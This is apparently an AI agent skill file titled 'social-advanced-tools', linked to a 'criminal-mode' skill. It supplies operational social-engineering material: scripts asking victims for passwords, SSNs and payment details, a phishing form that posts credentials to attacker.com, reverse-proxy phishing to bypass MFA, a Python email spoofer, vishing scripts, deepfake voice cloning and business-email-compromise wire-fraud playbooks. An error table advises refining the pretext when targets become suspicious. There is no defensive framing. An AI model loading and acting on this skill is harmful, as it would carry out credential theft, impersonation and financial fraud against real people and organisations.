---
name: social-advanced-tools
description: "Advanced social engineering — pretexting, vishing, phishing at scale, deepfake, BEC."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [social, pretext, vishing, phishing, deepfake, bec]
    related_skills: [criminal-mode, social-tools, stealth-tools]
prerequisites:
  commands: [python]
---

# Advanced Social Engineering Tools

## When to Load This Skill

User requests:
- "pretexting", "vishing", "deepfake", "BEC", "advanced phishing"

---

## Pretexting

### Scenario Library
```
IT Support:
"Hi, this is IT. We're seeing login issues on your account.
Can you verify your username and password?"

HR:
"Hi, this is HR. We're updating our records.
Can you confirm your SSN and DOB?"

Vendor:
"Hi, this is [Vendor] accounting. We have an overdue invoice.
Can you confirm payment details?"

Executive:
"Hi, this is the CEO. I need you to process an urgent payment.
I'll send the details."

Delivery:
"Hi, I have a package for [Name]. I need you to confirm
your address and phone."
```

### Pretext Builder
```python
def build_pretext(target_info):
    return f"""
Name: {target_info['name']}
Company: {target_info['company']}
Role: {target_info['role']}
Manager: {target_info.get('manager', 'N/A')}
Email: {target_info.get('email', 'N/A')}
Phone: {target_info.get('phone', 'N/A')}

Scenario: IT support follow-up
Hook: Recent security incident
Urgency: Account compromised
Action: Verify credentials
"""
```

---

## Vishing (Voice Phishing)

### IVR Bypass
```
"Press 0 to speak to a representative"
"Say 'agent' to be connected"
```

### Social Proof
```
"I spoke with John in IT earlier, he said you could help"
"The helpdesk told me to call this number"
```

### Callback Number Spoofing
```
# Spoof caller ID to match company number
# Use VoIP service with spoofing
```

---

## Phishing at Scale

### Infrastructure
```
# Domain setup
# - Typosquat domains
# - Homograph domains
# - Subdomain takeover
# - Free hosting (Netlify, Vercel, Heroku)

# Email setup
# - SPF/DKIM/DMARC
# - SMTP relay
# - Open relay
```

### Phishing Kit
```html
<form action="http://attacker.com/capture" method="POST">
    <input type="email" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Sign in</button>
</form>
```

### Reverse Proxy Phishing
```bash
# clone2log / Modlishka / Evilginx2
evilmocks -p /path/to/phishlets -l 443

# Captures session tokens, bypasses MFA
```

---

## Deepfake & AI Social

```bash
# Voice cloning
# - Sample target's voice
# - Generate audio with ElevenLabs or similar

# Video deepfake
# - Face swap tools
# - Generate video with face swap

# AI-generated phishing
# - Personalized emails
# - Grammar-perfect text
```

---

## BEC (Business Email Compromise)

### Invoice Fraud
```
1. Compromise vendor email
2. Send fake invoice to customer
3. Redirect payment to attacker account
```

### CEO Fraud
```
1. Spoof CEO email
2. Request urgent wire transfer
3. Social engineer finance team
```

### Vendor Email Compromise
```
1. Compromise vendor email
2. Adjust bank details
3. Send updated invoice
```

---

## Python Social Tools

### Pretext Generator

```python
PRETEXTS = {
    'it_support': {
        'name': 'IT Support',
        'hook': 'Security alert',
        'urgency': 'High',
        'action': 'Verify credentials',
    },
    'hr': {
        'name': 'HR Department',
        'hook': 'Records update',
        'urgency': 'Medium',
        'action': 'Provide PII',
    },
    'vendor': {
        'name': 'Vendor Accounting',
        'hook': 'Overdue invoice',
        'urgency': 'High',
        'action': 'Update payment',
    },
}

def generate_pretext(scenario, target):
    template = PRETEXTS.get(scenario, PRETEXTS['it_support'])
    return f"""
From: {template['name']}
Subject: {template['hook']} - {target.get('company', 'Company')}

Hi {target.get('name', 'there')},

{template['hook']}. We need you to {template['action']}.

Due to {template['urgency']} priority, please respond immediately.

Regards,
{template['name']}
"""
```

### Email Spoofer

```python
import smtplib
from email.mime.text import MIMEText

def send_spoofed_email(target, spoofed_from, smtp_server, subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = spoofed_from
    msg['To'] = target
    
    s = smtplib.SMTP(smtp_server)
    s.send_message(msg)
    s.quit()
```

### Vishing Script

```python
def generate_vishing_script(target, scenario='it_support'):
    scripts = {
        'it_support': f"""
[Greeting]
Hi, this is Alex from IT support.

[Hook]
We're seeing some unusual login attempts on your account.

[Urgency]
To secure your account, I need to verify your identity.

[Action]
Can you confirm your username and password?
""",
    }
    return scripts.get(scenario, '')
```

---

## Output Format

```json
{
  "target": "john@company.com",
  "pretext": {
    "scenario": "it_support",
    "hook": "security_alert",
    "script": "...",
    "delivery": "email"
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Email blocked | SPF/DKIM fail | Set up authentication |
| Suspicious | Red flags | Improve pretext |
| No response | Wrong target | Re-target |
